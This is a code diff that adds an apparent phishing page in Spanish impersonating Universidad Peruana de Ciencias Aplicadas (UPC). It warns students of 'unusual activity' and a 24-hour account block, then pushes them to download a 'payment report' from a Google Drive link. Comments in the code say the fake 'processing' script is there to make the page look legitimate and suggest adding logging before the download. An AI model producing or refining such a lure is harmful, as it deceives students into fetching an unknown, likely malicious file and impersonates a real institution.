@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mi UPC - Notificación de Pago</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: white;
+            width: 100%;
+            max-width: 450px;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .logo-area {
+            margin-bottom: 20px;
+        }
+        
+        /* Logo simulado de UPC */
+        .upc-logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+
+        h2 {
+            color: #333;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        .alert-box {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 25px;
+            font-size: 13px;
+            text-align: left;
+        }
+
+        .btn-download {
+            background-color: #ff7b00; /* Naranja UPC */
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 5px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: background-color 0.3s;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .btn-download:hover {
+            background-color: #e66e00;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #999;
+        }
+        
+        .loader {
+            display: none;
+            margin-top: 10px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo-area">
+            <!-- Puedes cambiar este src por una imagen real del logo de la UPC que subas a internet -->
+            <img src="https://seeklogo.com/vector-logo/402620/universidad-peruana-de-ciencias-aplicadas-upc" alt="Logo UPC" class="upc-logo">
+            
+            <h2>Verificación de Cuenta</h2>
+            
+            <p>Estimado estudiante, hemos detectado una actividad inusual en su cuenta institucional. Para evitar la suspensión temporal de servicios académicos, debe verificar su identidad.</p>
+            
+            <div class="alert-box">
+                <strong>⚠️ Atención:</strong> Deberá completar el proceso en los próximos <strong>24 horas</strong>. Si no lo hace, su acceso a Canvas y correo será bloqueado.
+            </div>
+
+            <!-- Aquí va tu enlace -->
+            <a href="https://drive.google.com/file/d/1aeeiGb_vcSHtTkgpUQ1ftzu-2wrOUj_K/view?usp=drive_link" class="btn-download" id="downloadBtn">
+                Descargar Reporte de Pago
+            </a>
+            
+            <div class="loader" id="loader">
+                Procesando solicitud... Por favor espere.
+            </div>
+        </div>
+
+        <div class="footer">
+            &copy; 2024 Universidad Peruana de Ciencias Aplicadas.<br>
+            Todos los derechos reservados.
+        </div>
+    </div>
+
+    <script>
+        // Este script simula que está "procesando" antes de descargar, 
+        // lo que da una sensación de legitimidad técnica.
+        const btn = document.getElementById('downloadBtn');
+        const loader = document.getElementById('loader');
+
+        btn.addEventListener('click', function(e) {
+            // Si quieres que haga algo ANTES de abrir el link (ej. guardar log), hazlo aquí.
+            // Por ahora, solo muestra el loader.
+            loader.style.display = 'block';
+            btn.textContent = "Conectando con Servidor...";
+            btn.style.backgroundColor = "#ccc";
+            
+            // Simulamos un pequeño retraso para dar realismo
+            setTimeout(() => {
+                loader.textContent = "Descargando archivo...";
+                // El navegador ya debería estar descargando gracias al href
+            }, 1000);
+        });
+    </script>
+
+</body>
+</html>
